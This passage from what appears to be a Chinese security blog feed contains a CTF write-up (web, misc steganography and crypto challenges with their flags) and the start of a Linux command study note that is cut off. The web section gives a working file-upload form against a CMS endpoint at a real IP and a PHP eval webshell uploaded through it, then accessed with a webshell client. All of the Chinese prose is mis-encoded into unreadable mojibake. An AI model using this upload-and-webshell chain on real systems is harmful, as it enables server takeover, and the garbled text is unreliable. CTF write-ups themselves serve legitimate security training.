class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">Â  Â  &lt;body&gt;</span><br><span class="line">Â  Â  &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;129.204.81.127:6333&#x2F;admin&#x2F;index.php?c&#x3D;uploadfile&amp;a&#x3D;uploadify_upload&amp;type&#x3D;php&amp;size&#x3D;1000&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">Â  Â  &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">Â  Â  &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br><span class="line">Â  Â  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">Â  Â  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/19/Dua7QS.png" alt="Dua7QS.png"></p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p><ul><li>test3.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/19/DuaXon.png" alt="DuaXon.png"></p><p>ç‚¹å‡»æäº¤ï¼Œå¾—åˆ°æ–‡ä»¶è·¯å¾„</p><p><code>http://129.204.81.127:6333/data/upload/file/202011/28022b121a56bd7461ecdb38db70cd1f.php</code></p><p>ç”¨èšå‰‘æ‰“å¼€ï¼Œå¯†ç ä¸ºcmdï¼Œåœ¨æ–‡ä»¶æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p><br><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="è¡¨ç™½"><a href="#è¡¨ç™½" class="headerlink" title="è¡¨ç™½"></a>è¡¨ç™½</h3><p>ç”¨010editoræ‰“å¼€ï¼Œä¿®æ”¹å›¾ç‰‡é«˜åº¦ï¼Œå°±å¯ä»¥çœ‹åˆ°flag</p><p><img src="https://s3.ax1x.com/2020/11/19/Dudbp6.png" alt="Dudbp6.png"></p><br><h3 id="è€çƒŸæª"><a href="#è€çƒŸæª" class="headerlink" title="è€çƒŸæª"></a>è€çƒŸæª</h3><p>å°†<code>cxk.jpg</code>æ‹–åˆ°kaliï¼Œæå–éšè—æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e cxk.jpg</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>flag.png</code>ï¼Œç”¨psæ°´å¹³ç¿»è½¬ï¼Œå°±å¯ä»¥çœ‹æ¸…æ¥šflag</p><p><img src="https://s3.ax1x.com/2020/11/19/Duw8uF.png" alt="Duw8uF.png"></p><br><h3 id="lsb"><a href="#lsb" class="headerlink" title="lsb"></a>lsb</h3><p>LSBéšå†™ï¼Œç”¨Stegsolveæ‰“å¼€ï¼Œç‚¹Analyse-Data Extract</p><p><img src="https://s3.ax1x.com/2020/11/19/Duwj2V.png" alt="Duwj2V.png"></p><p>ç‚¹å‡»Save Bin ä¿å­˜ä¸º1.pngï¼Œæ˜¯ä¸€å¼ äºŒç»´ç ï¼Œæ‰«ç å°±å¯ä»¥å¾—åˆ°flag</p><br><h3 id="ä½ èƒ½ç ´è§£å—"><a href="#ä½ èƒ½ç ´è§£å—" class="headerlink" title="ä½ èƒ½ç ´è§£å—?"></a>ä½ èƒ½ç ´è§£å—?</h3><p>hintï¼šå‹ç¼©åŒ…å¯†ç ä¸ºg2mtuåŠ å››ä½æ•°å­—</p><p>ç”Ÿæˆå¯†ç å­—å…¸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file = open(<span class="string">&quot;1.dic&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line">file.write(<span class="string">&quot;g2mtu&quot;</span>+str(i)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/19/DuDcE4.png" alt="DuDcE4.png"></p><p>è§£å‹å¾—åˆ°flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dGhpcyBpcyB5b3VyIGZsYWd7dzNsZTBjb21lX3RvX0cybXRVY1RmfQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>ç”¨base64è§£å¯†å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w3le0come_to_G2mtUcTf&#125;</span><br></pre></td></tr></table></figure><br><h3 id="disk"><a href="#disk" class="headerlink" title="disk"></a>disk</h3><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/flying_bird2019/article/details/105240908">2020æ˜“åšéœ–CTFMisc2â€“Diské¢˜è§£</a></p><p>ç”¨æå–éšè—æ–‡ä»¶</p><p><code>readme</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Q:where is passw0rd?</span><br><span class="line">A:Be Deleted.</span><br></pre></td></tr></table></figure><p>åº”è¯¥è¦æ¢å¤è¢«åˆ é™¤çš„å¯†ç çš„ï¼Œå¯æ˜¯extundeleteå®‰è£…ä¸äº†</p><p>åªèƒ½ç”¨010editoræ‰“å¼€disk0ï¼ŒæŸ¥æ‰¾æœ‰æ²¡æœ‰å¯†ç </p><p>å°è¯•äº†å¥½å‡ ä¸ªï¼š<code>password</code>ï¼Œ<code>passw0rd</code>ï¼Œ<code>passwd</code>ï¼Œ<code>pass</code>ï¼Œ<code>word</code>ï¼Œ<code>ps</code>ï¼Œ<code>wd</code></p><p>æœ€åæ‰¾åˆ°ä¸€ä¸ªç±»ä¼¼å¯†ç çš„ä¸œè¥¿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">don0tgu355p@sswd</span><br></pre></td></tr></table></figure><p>è§£å‹<code>lever1.zip</code>ï¼Œå¾—åˆ°flag.png</p><p>ä¿®æ”¹å›¾ç‰‡é«˜åº¦å°±å¯ä»¥å¾—åˆ°flag</p><br><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="æºæ’’å°†å†›"><a href="#æºæ’’å°†å†›" class="headerlink" title="æºæ’’å°†å†›"></a>æºæ’’å°†å†›</h3><p>é¢˜ç›®ï¼š</p><p>æºæ’’å°†å†›ä½¿ç”¨äº†ä¸€ç§æŠ€æœ¯è¿ç­¹å¸·å¹„ï¼ŒæŒ‡æŒ¥åƒé‡Œå°†å£«å†³èƒœåƒé‡Œã€‚</p><p>æ•Œå†›æ­£å¥½æˆªè·äº†ä¸€ä¸²å¯†æ–‡ ]p{k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@</p><p>offset: 3</p><br><p>ç”¨<a href="https://blog.csdn.net/hengliang_/article/details/80496326">java Stringå­—ç¬¦ä¸²ä¸Asciiäº’ç›¸è½¬æ¢</a>çš„ä»£ç è§£å¯†</p><ul><li>Test02</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String string = <span class="string">&quot;]p&#123;k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@&quot;</span>;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">char</span>[] ch = string.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ch.length; i++) &#123;</span><br><span class="line">            sb.append(Integer.valueOf(ch[i]).intValue()-<span class="number">3</span>).append(<span class="string">&quot; &quot;</span>);<span class="comment">// åŠ ç©ºæ ¼</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">90 109 120 104 90 51 116 106 99 110 108 119 100 71 57 102 97 88 78 102 97 72 104 105 88 51 78 118 88 50 86 66 99 51 107 119 102 81 61 61 </span><br></pre></td></tr></table></figure><ul><li>Test03</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test03</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String value = <span class="string">&quot;90 109 120 104 90 51 116 106 99 110 108 119 100 71 57 102 97 88 78 102 97 72 104 105 88 51 78 118 88 50 86 66 99 51 107 119 102 81 61 61 &quot;</span>;</span><br><span class="line">        StringBuffer sbu = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String[] chars = value.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">            sbu.append((<span class="keyword">char</span>) Integer.parseInt(chars[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sbu.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tjcnlwdG9faXNfaHhiX3NvX2VBc3kwfQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64è§£å¯†åå¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;crypto_is_hxb_so_eAsy0&#125;</span><br></pre></td></tr></table></figure><br><h3 id="å°æ˜å®¶çš„å°èœå›­"><a href="#å°æ˜å®¶çš„å°èœå›­" class="headerlink" title="å°æ˜å®¶çš„å°èœå›­"></a>å°æ˜å®¶çš„å°èœå›­</h3><p>é¢˜ç›®ï¼š</p><p>å°æ˜å®¶èœå›­è¦å»ºæ …æ ï¼Œè¯·æ•™äº†ä»–å¿ƒçˆ±çš„å¥³ç¥ï¼Œå¥³ç¥ç»™äº†è¿™ä¹ˆç‚¹æç¤ºï¼Œä»–å´çœ‹ä¸æ‡‚ï¼Œä½ èƒ½å¸®åŠ©ä»–å—ï¼Ÿ</p><p>f_tnluz_aghggeao{t_oy_ldoia}</p><br><p>æ …æ å¯†ç </p><p><img src="https://s3.ax1x.com/2020/11/19/Du65JH.png" alt="Du65JH.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yo_uget_itzha_lan_good&#125;</span><br></pre></td></tr></table></figure><br><h3 id="æˆ˜æŠ¥"><a href="#æˆ˜æŠ¥" class="headerlink" title="æˆ˜æŠ¥"></a>æˆ˜æŠ¥</h3><p>æˆ‘å†›æˆåŠŸæ£æ¯æ•Œå†›ç§˜å¯†ç”µå°ç¼´è·å¯†æ–‡å’Œæ˜æ–‡ä¸€ä»½ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä»½å¯†æ–‡éš¾ä»¥ç ´è§£ç‰¹è¯·ä½ æ¥ç ´è¯‘å¯†ç ï¼š</p><p>å¾…è§£å¯†æ–‡ï¼šgivfome</p><br><p>ç”¨<a href="https://blog.csdn.net/m0_46132784/article/details/109597249">è„šæœ¬</a>è¿›è¡Œè¯é¢‘åˆ†æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]&quot;</span></span><br><span class="line"></span><br><span class="line">data = input()</span><br><span class="line"></span><br><span class="line">result = &#123;d:<span class="number">0</span> <span class="keyword">for</span> d <span class="keyword">in</span> alphabet&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_by_value</span>(<span class="params">d</span>):</span></span><br><span class="line">    items = d.items()</span><br><span class="line">    backitems = [[v[<span class="number">1</span>],v[<span class="number">0</span>]] <span class="keyword">for</span> v <span class="keyword">in</span> items]</span><br><span class="line">    backitems.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">    print(backitems,<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> [ backitems[i][<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(backitems))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">if</span> d == alpha:</span><br><span class="line">            result[alpha] = result[alpha] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(sort_by_value(result)))</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/19/Du2Lex.png" alt="Du2Lex.png"></p><p>å¯†æ–‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">givfometjlysnhuczkwbrqdxpa&#125;&#123;_^][ZYXWVUTSRQPONMLKJIHGFEDCBA@&#x3D;9876543210-+*)(&amp;%$#!</span><br></pre></td></tr></table></figure><p>æ˜æ–‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eantosirlhugdpcmf0wybvkA)(S21xTPC86-zjWLE4qUNMIGB53&#125;&#123;_^]</span><br><span class="line">ZYXVRQOKJHFD@&#x3D;97+*&amp;%$#!</span><br></pre></td></tr></table></figure><p>è§£å¯†å¯†æ–‡ï¼šgivfomeï¼Œå¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eantosi&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¬”è®°â€”â€”Linux</title>
      <link href="2020/11/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Linux/"/>
      <url>2020/11/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Linux/</url>
      
        <content type="html"><![CDATA[<p>Linuxæ˜¯å¼€æºçš„æ“ä½œç³»ç»Ÿï¼Œç³»ç»Ÿç‰¹ç‚¹æœ‰ï¼šå¼€æ”¾æ€§ï¼ˆå¼€æºï¼‰ã€å¤šç”¨æˆ·ã€å¤šä»»åŠ¡ã€è‰¯å¥½çš„ç”¨æˆ·ç•Œé¢ã€ä¼˜å¼‚çš„æ€§èƒ½ä¸ç¨³å®šæ€§ç­‰ç­‰ã€‚</p><p>å­¦ä¹ ç¬”è®°ç›®å½•ï¼š</p><ul><li>æ–‡ä»¶ç›®å½•ç»“æ„</li><li>ç»ˆç«¯</li><li>è·¯å¾„</li><li>æŒ‡ä»¤</li></ul><br><a id="more"></a><h2 id="æ–‡ä»¶ç›®å½•ç»“æ„"><a href="#æ–‡ä»¶ç›®å½•ç»“æ„" class="headerlink" title="æ–‡ä»¶ç›®å½•ç»“æ„"></a>æ–‡ä»¶ç›®å½•ç»“æ„</h2><p><a href="https://imgchr.com/i/Bz52Ks"><img src="https://s3.ax1x.com/2020/11/12/Bz52Ks.png" alt="Bz52Ks.png"></a></p><p>binï¼šå…¨ç§°binaryï¼Œå«ä¹‰æ˜¯äºŒè¿›åˆ¶ã€‚è¯¥ç›®å½•ä¸­å­˜å‚¨çš„éƒ½æ˜¯ä¸€äº›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ–‡ä»¶éƒ½æ˜¯å¯ä»¥è¢«è¿è¡Œçš„ã€‚</p><p>devï¼šè¯¥ç›®å½•ä¸­ä¸»è¦å­˜æ”¾çš„æ˜¯å¤–æ¥è®¾å¤‡ï¼Œä¾‹å¦‚ç›˜ã€å…¶ä»–çš„å…‰ç›˜ç­‰ã€‚åœ¨å…¶ä¸­çš„å¤–æ¥è®¾å¤‡æ˜¯ä¸èƒ½ç›´æ¥è¢«ä½¿ç”¨çš„ï¼Œéœ€è¦<strong>æŒ‚è½½</strong>ï¼ˆç±»ä¼¼windowsä¸‹çš„åˆ†é…ç›˜ç¬¦ï¼‰ã€‚</p><p>etcï¼šè¯¥ç›®å½•ä¸»è¦å­˜å‚¨ä¸€äº›é…ç½®æ–‡ä»¶ã€‚</p><p>homeï¼šè¡¨ç¤ºâ€œå®¶â€ï¼Œè¡¨ç¤º<strong>é™¤äº†rootç”¨æˆ·ä»¥å¤–å…¶ä»–ç”¨æˆ·çš„å®¶ç›®å½•</strong>ï¼Œç±»ä¼¼äºwindowsä¸‹çš„User/ç”¨æˆ·ç›®å½•ã€‚</p><p>mntï¼šå½“å¤–æ¥è®¾å¤‡éœ€è¦æŒ‚è½½çš„æ—¶å€™ï¼Œå°±éœ€è¦æŒ‚è½½åˆ°mntç›®å½•ä¸‹ã€‚</p><p>procï¼šprocessï¼Œè¡¨ç¤ºè¿›ç¨‹ï¼Œè¯¥ç›®å½•ä¸­å­˜å‚¨çš„æ˜¯Linuxè¿è¡Œæ—¶å€™çš„è¿›ç¨‹ã€‚</p><p>rootï¼šè¯¥ç›®å½•æ˜¯rootç”¨æˆ·è‡ªå·±çš„å®¶ç›®å½•ã€‚</p><p>sbinï¼šå…¨ç§°super binaryï¼Œè¯¥ç›®å½•ä¹Ÿæ˜¯å­˜å‚¨ä¸€äº›å¯ä»¥è¢«æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ˜¯å¿…é¡»å¾—æœ‰superæƒé™çš„ç”¨æˆ·æ‰èƒ½æ‰§è¡Œã€‚</p><p>tmpï¼šè¡¨ç¤ºâ€œä¸´æ—¶â€çš„ï¼Œå½“ç³»ç»Ÿè¿è¡Œæ—¶å€™äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ä¼šåœ¨è¿™ä¸ªç›®å½•å­˜ç€ã€‚</p><p>usrï¼šå­˜æ”¾çš„æ˜¯ç”¨æˆ·è‡ªå·±å®‰è£…çš„è½¯ä»¶ã€‚ç±»ä¼¼äºwindowsä¸‹çš„program filesã€‚</p><p>varï¼šå­˜æ”¾çš„ç¨‹åº/ç³»ç»Ÿçš„æ—¥å¿—æ–‡ä»¶çš„ç›®å½•ã€‚</p><br><h2 id="ç»ˆç«¯"><a href="#ç»ˆç«¯" class="headerlink" title="ç»ˆç«¯"></a>ç»ˆç«¯</h2><p><a href="https://imgchr.com/i/Bz4Sw6"><img src="https://s3.ax1x.com/2020/11/12/Bz4Sw6.png" alt="Bz4Sw6.png"></a></p><p><code>kali</code>ï¼šå½“å‰ç»ˆç«¯ç™»å½•çš„ç”¨æˆ·å</p><p><code>@</code>ï¼šå‘éŸ³atï¼Œè¡¨ç¤ºâ€åœ¨â€œ</p><p><code>kali</code>ï¼šå½“å‰ç™»å½•çš„ä¸»æœºå</p><p><code>~/æ¡Œé¢</code>ï¼šå½“å‰ç»ˆç«¯çš„å·¥ä½œç›®å½•</p><p><code>$</code>ï¼šèº«ä»½è¯†åˆ«ç¬¦ï¼Œå¦‚æœæ˜¯è¶…çº§ç®¡ç†å‘˜ç™»å½•åˆ™æ˜¾ç¤º<code>#</code>ï¼Œå¦åˆ™æ˜¾ç¤º<code>$</code>ç¬¦å·</p><br><ul><li>è¶…çº§ç®¡ç†å‘˜ç»ˆç«¯ç•Œé¢å¦‚ä¸‹ï¼š</li></ul><p><a href="https://imgchr.com/i/BzItiT"><img src="https://s3.ax1x.com/2020/11/12/BzItiT.png" alt="BzItiT.png"></a></p><br><h2 id="è·¯å¾„"><a href="#è·¯å¾„" class="headerlink" title="è·¯å¾„"></a>è·¯å¾„</h2><p>è·¯å¾„å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼šç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„</p><ul><li>ç›¸å¯¹è·¯å¾„ï¼š</li></ul><p><code>./</code>ï¼šè¡¨ç¤ºå½“å‰ç›®å½•ä¸‹ï¼›<code>../</code>ï¼šè¡¨ç¤ºå½“å‰ç›®å½•ä¸‹</p><ul><li>ç»å¯¹è·¯å¾„ï¼š</li></ul><p><code>/</code>ï¼šä»æ ¹ç›®å½•ä¸‹å¯»æ‰¾å¯¹åº”è·¯å¾„</p><blockquote><p>åœ¨Linuxä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç¬¦å·â€œ~â€ï¼Œè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„å®¶ç›®å½•ã€‚</p></blockquote><br><h2 id="æŒ‡ä»¤"><a href="#æŒ‡ä»¤" class="headerlink" title="æŒ‡ä»¤"></a>æŒ‡ä»¤</h2><p>LinuxæŒ‡ä»¤é€šç”¨æ ¼å¼</p><p>#æŒ‡ä»¤ä¸»ä½“ï¼ˆç©ºæ ¼ï¼‰ [é€‰é¡¹]ï¼ˆç©ºæ ¼ï¼‰ [æ“ä½œå¯¹è±¡]</p><p>ä¸€ä¸ªæŒ‡ä»¤å¯ä»¥åŒ…å«å¤šä¸ªé€‰é¡¹</p><p>æ“ä½œå¯¹è±¡ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª</p><br><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p><strong>(list)</strong></p><ul><li>ls</li></ul><p>åˆ—å‡ºå½“å‰å·¥ä½œç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶/æ–‡ä»¶å¤¹çš„åç§°</p><ul><li>ls è·¯å¾„</li></ul><p>åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶/æ–‡ä»¶å¤¹çš„åç§°</p><ul><li><p>ls é€‰é¡¹ è·¯å¾„</p><ul><li><p>ls -l è·¯å¾„</p><p>-lï¼šè¡¨ç¤ºlistï¼Œè¡¨ç¤ºä»¥è¯¦ç»†åˆ—è¡¨çš„å½¢å¼è¿›è¡Œå±•ç¤º</p></li><li><p>ls -a è·¯å¾„</p><p>-aï¼šè¡¨ç¤ºæ˜¾ç¤ºæ‰€æœ‰çš„æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼ˆåŒ…å«äº†éšè—æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼‰</p></li><li><p>ls -lh è·¯å¾„</p><p>-lhï¼š-aï¼šè¡¨ç¤ºæ˜¾ç¤ºæ‰€æœ‰çš„æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼ˆåŒ…å«äº†éšè—æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼‰</p></li></ul></li></ul><br><h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p><strong>(print working directory)</strong></p><ul><li>pwd</li></ul><p>æ‰“å°å½“å‰å·¥ä½œç›®å½•</p><br><h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><p><strong>(change directory)</strong></p><ul><li>cd è·¯å¾„</li></ul><p>åˆ‡æ¢åˆ°è·¯å¾„æ‰€åœ¨ç›®å½•</p><br><h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><p><strong>(make directory)</strong></p><ul><li>mkdir è·¯å¾„</li></ul><p>åˆ›å»ºç›®å½•ï¼Œå¯ä»¥æ˜¯æ–‡ä»¶å¤¹åç§°ä¹Ÿå¯ä»¥æ˜¯åŒ…å«åç§°çš„ä¸€ä¸ªå®Œæ•´è·¯å¾„</p><ul><li>mkdir -p è·¯å¾„</li></ul><p>å½“ä¸€æ¬¡æ€§åˆ›å»ºå¤šå±‚ä¸å­˜åœ¨çš„ç›®å½•çš„æ—¶å€™ï¼Œæ·»åŠ -på‚æ•°ï¼Œå¦åˆ™ä¼šæŠ¥é”™</p><ul><li>mkdir è·¯å¾„1 è·¯å¾„2 è·¯å¾„3 â€¦</li></ul><p>è¡¨ç¤ºä¸€æ¬¡æ€§åˆ›å»ºå¤šä¸ªç›®å½•</p><br><h3 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h3><p><strong>åˆ›å»ºæ–‡ä»¶</strong></p><ul><li>touch æ–‡ä»¶è·¯å¾„</li></ul><p>æ–‡ä»¶è·¯å¾„å¯ä»¥æ˜¯ç›´æ¥çš„æ–‡ä»¶åä¹Ÿå¯ä»¥æ˜¯è·¯å¾„ï¼Œtouchä¹Ÿå¯ä»¥åŒæ—¶åˆ›å»ºå¤šä¸ªæ–‡ä»¶</p><br><h3 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h3><ul><li>clear</li></ul><p>æ¸…å±</p><br><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><p><strong>(copy)</strong></p><ul><li>cp è¢«å¤åˆ¶çš„æ–‡æ¡£è·¯å¾„ æ–‡æ¡£è¢«å¤åˆ¶åˆ°çš„è·¯å¾„</li></ul><p>å¤åˆ¶æ–‡æ¡£åˆ°æ–°è·¯å¾„ä¸‹çš„ä½ç½®ï¼Œåœ¨å¤åˆ¶è¿‡ç¨‹ä¸­æ˜¯å¯ä»¥å¯¹æ–°ä½ç½®çš„æ–‡ä»¶é‡å‘½åçš„</p><ul><li>cp -r è¢«å¤åˆ¶çš„æ–‡ä»¶å¤¹è·¯å¾„ æ–‡ä»¶å¤¹è¢«å¤åˆ¶åˆ°çš„è·¯å¾„</li></ul><p><code>-r</code>è¡¨ç¤ºé€’å½’å¤åˆ¶</p><br><h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><p><strong>(move)</strong></p><ul><li>mv éœ€è¦ç§»åŠ¨çš„æ–‡æ¡£è·¯å¾„ éœ€è¦ä¿å­˜çš„ä½ç½®è·¯å¾„</li></ul><p>ç§»åŠ¨æ–‡æ¡£åˆ°æ–°ä½ç½®ï¼ŒåŸå§‹æ–‡ä»¶åœ¨ç§»åŠ¨åä¸åœ¨åŸå§‹ä½ç½®</p><ul><li>mv éœ€è¦ç§»åŠ¨çš„æ–‡ä»¶å¤¹è·¯å¾„ éœ€è¦ä¿å­˜çš„ä½ç½®è·¯å¾„</li></ul><p>ç§»åŠ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼ŒåŒç§»åŠ¨æ–‡æ¡£</p><br><p>æ³¨ï¼š</p><p><strong>åœ¨Linuxä¸­é‡å‘½åçš„å‘½ä»¤ä¹Ÿæ˜¯mvï¼Œè¯­æ³•å’Œç§»åŠ¨è¯­æ³•ä¸€æ ·</strong></p><p>å¦‚ï¼šé‡å‘½åæ ¹ç›®å½•ä¸‹çš„<code>a.txt</code>ä¸º<code>b.txt</code></p><p>mv /a.txt /b.txt</p><br><h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><p><strong>(remove)</strong></p><ul><li><p>rm 